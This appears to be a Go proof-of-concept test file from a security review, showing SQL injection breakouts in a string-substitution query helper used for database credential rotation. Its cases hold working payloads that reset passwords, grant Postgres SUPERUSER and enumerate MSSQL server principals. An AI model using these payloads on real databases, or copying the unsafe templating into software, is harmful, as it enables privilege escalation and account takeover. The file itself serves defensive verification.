// Proof tests for AppSec review B4DB — QueryHelper / dropUserSQL breakouts.
// Run: go test /workspace/security-findings/sqli_breakout_proof_test.go -count=1
package security_findings_test

import (
	"fmt"
	"strings"
	"testing"
)

func queryHelper(tpl string, data map[string]string) string {
	for k, v := range data {
		tpl = strings.ReplaceAll(tpl, fmt.Sprintf("{{%s}}", k), v)
	}
	return tpl
}

func TestDefaultSQLInjectionBreakouts(t *testing.T) {
	cases := []struct {
		name     string
		tpl      string
		username string
		password string
		want     string
	}{
		{
			name:     "mysql-default-rotate-hash-comment",
			tpl:      `ALTER USER '{{username}}'@'%' IDENTIFIED BY '{{password}}';`,
			username: `victim'@'%' IDENTIFIED BY 'pwned-via-plugin';#`,
			password: "vault-rotated-secret",
			want:     `ALTER USER 'victim'@'%' IDENTIFIED BY 'pwned-via-plugin';#'@'%' IDENTIFIED BY 'vault-rotated-secret';`,
		},
		{
			name:     "postgres-default-rotate-quote-breakout",
			tpl:      `ALTER ROLE "{{username}}" WITH PASSWORD '{{password}}';`,
			username: `victim" WITH SUPERUSER; --`,
			password: "vault-rotated-secret",
			want:     `ALTER ROLE "victim" WITH SUPERUSER; --" WITH PASSWORD 'vault-rotated-secret';`,
		},
		{
			name:     "mssql-alter-login-bracket-breakout",
			tpl:      `ALTER LOGIN [{{username}}] WITH PASSWORD = '{{password}}'`,
			username: `a] WITH PASSWORD = 'x'; SELECT 'injected';--`,
			password: "vault-rotated-secret",
			want:     `ALTER LOGIN [a] WITH PASSWORD = 'x'; SELECT 'injected';--] WITH PASSWORD = 'vault-rotated-secret'`,
		},
		{
			name:     "hana-default-rotate-unquoted",
			tpl:      `ALTER USER {{username}} PASSWORD "{{password}}"`,
			username: `VICTIM PASSWORD "pwned" --`,
			password: "vault-rotated-secret",
			want:     `ALTER USER VICTIM PASSWORD "pwned" -- PASSWORD "vault-rotated-secret"`,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := queryHelper(tc.tpl, map[string]string{
				"username": tc.username,
				"password": tc.password,
			})
			if got != tc.want {
				t.Fatalf("got %q want %q", got, tc.want)
			}
		})
	}

	dropUserSQL := "USE [%s]\nDROP USER [%s]"
	got := fmt.Sprintf(dropUserSQL, `x]; SELECT name FROM sys.server_principals;--`, "v-user")
	wantPrefix := "USE [x]; SELECT name FROM sys.server_principals;--]"
	if !strings.HasPrefix(got, wantPrefix) {
		t.Fatalf("dropUserSQL breakout failed: %q", got)
	}
}
